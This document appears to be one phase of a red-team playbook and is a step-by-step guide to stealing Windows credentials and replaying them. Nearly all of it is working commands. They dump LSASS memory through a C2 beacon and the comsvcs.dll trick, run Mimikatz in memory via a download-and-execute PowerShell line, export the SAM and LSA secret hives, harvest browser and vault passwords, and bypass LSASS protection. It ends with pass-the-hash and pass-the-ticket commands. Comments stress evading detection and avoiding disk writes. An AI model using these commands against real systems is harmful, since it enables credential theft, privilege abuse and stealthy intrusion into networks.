# Phase 06: Credential Access & Replay

> SYSTEM on the foothold → dump everything → find the next hop's creds.

---

## 1. LSASS Dump (Primary Method)

```bash
# Via C2 execute-assembly (in-memory, no disk write)
sliver (beacon) > execute-assembly /tools/Rubeus.exe dump /nowrap
sliver (beacon) > execute-assembly /tools/SharpDump.exe

# nanodump (stealthy — forks LSASS, minimal EDR footprint)
sliver (beacon) > execute-assembly /tools/nanodump.exe --write C:\Windows\Temp\lsass.dmp

# comsvcs.dll (LOLBin — signed Microsoft DLL)
# Get LSASS PID first:
Get-Process lsass | Select Id
# Then dump:
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <LSASS_PID> C:\Windows\Temp\lsass.dmp full
```

```bash
# Parse offline on Kali
pypykatz lsa minidump lsass.dmp
# → NT hashes, AES Kerberos keys, sometimes cleartext passwords
```

---

## 2. Mimikatz (In-Memory Via C2)

```bash
# Via execute-assembly (never touch disk)
sliver (beacon) > execute-assembly /tools/Mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Or via PowerShell (after AMSI bypass)
IEX (New-Object Net.WebClient).DownloadString('http://<ip>/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'
```

---

## 3. SAM + LSA Secrets (Local Hashes)

```bash
# From Kali with admin creds:
secretsdump.py domain/administrator:Password1@<target_ip>

# From elevated shell on target:
reg save HKLM\SAM C:\Windows\Temp\sam.save
reg save HKLM\SYSTEM C:\Windows\Temp\sys.save
reg save HKLM\SECURITY C:\Windows\Temp\sec.save
# Transfer files → parse offline:
secretsdump.py -sam sam.save -system sys.save -security sec.save LOCAL
```

---

## 4. Credential Vaults & Stored Passwords

```powershell
# Windows Credential Manager
cmdkey /list
.\Seatbelt.exe WindowsCredentialFiles

# PowerShell history (goldmine for passwords)
Get-Content (Get-PSReadlineOption).HistorySavePath
Get-Content C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt -EA SilentlyContinue

# Chrome / browser saved passwords (DPAPI)
sliver (beacon) > execute-assembly /tools/SharpChrome.exe logins

# Registry stored creds
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
# AutoAdminLogon, DefaultUserName, DefaultPassword fields
```

---

## 5. Bypassing Process Protection (PPL / LSA Protection)

```bash
# If LSASS is PPL-protected (nanodump handles this):
sliver (beacon) > execute-assembly /tools/nanodump.exe --ppl-bypass --write lsass.dmp

# PPLBlade — dedicated PPL bypass tool
sliver (beacon) > execute-assembly /tools/PPLBlade.exe --mode dump --name lsass.exe --output lsass.dmp
```

---

## 6. Pass-the-Hash / Pass-the-Ticket

```bash
# PtH — use NT hash without cracking
nxc smb <targets> -u username -H <NTLM_hash> --continue-on-success
evil-winrm -i <target> -u username -H <NTLM_hash>
psexec.py domain/username@<target> -hashes :<NTLM_hash>

# PtT — inject Kerberos ticket
export KRB5CCNAME=user.ccache
secretsdump.py -k -no-pass <target>

# Overpass-the-Hash (NTLM hash → Kerberos TGT)
.\Rubeus.exe asktgt /user:username /rc4:<NTLM_hash> /domain:domain.local /ptt
```

---

## Next Step → **Phase 07: Lateral Movement** (`07-lateral-movement.md`)
